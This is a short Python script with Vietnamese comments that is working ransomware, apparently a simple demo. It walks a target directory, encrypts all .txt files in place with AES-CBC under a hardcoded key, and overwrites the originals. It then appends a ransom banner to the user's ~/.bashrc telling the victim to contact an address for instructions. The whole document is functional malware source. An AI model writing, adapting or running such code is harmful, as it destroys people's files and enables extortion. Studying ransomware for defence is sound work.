import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Khóa AES 16 bytes (hardcode)
KEY = b"thisisasecretkey"

# Hàm mã hóa dữ liệu bằng AES
def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    
    # Padding dữ liệu
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    # Mã hóa
    iv = os.urandom(16)  # Khởi tạo IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Ghi lại dữ liệu đã mã hóa (bao gồm IV)
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

# Hàm mã hóa toàn bộ file `.txt` trong thư mục
def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):  # Chỉ mã hóa file .txt
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                print(f"Mã hóa: {file_path}")

# Hàm thêm thông báo vào terminal (hiện banner mỗi lần mở shell)
def add_ransom_note():
    bashrc_path = os.path.expanduser("~/.bashrc")
    ransom_note = """
echo "
===============================
    HỆ THỐNG CỦA BẠN ĐÃ BỊ MÃ HÓA!
===============================
Mọi tệp tin quan trọng của bạn đã bị mã hóa.
Liên hệ admin@example.com để được hướng dẫn.
"
"""
    with open(bashrc_path, "a") as bashrc:
        bashrc.write(ransom_note)

# Main
if __name__ == "__main__":
    target_directory = "./test/"  # Thay bằng đường dẫn mục tiêu
    
    print("Bắt đầu mã hóa các file...")
    encrypt_directory(target_directory, KEY)
    print("Hoàn tất mã hóa.")
    
    print("Thêm thông báo đòi tiền chuộc vào terminal...")
    add_ransom_note()
    print("Hoàn tất.")

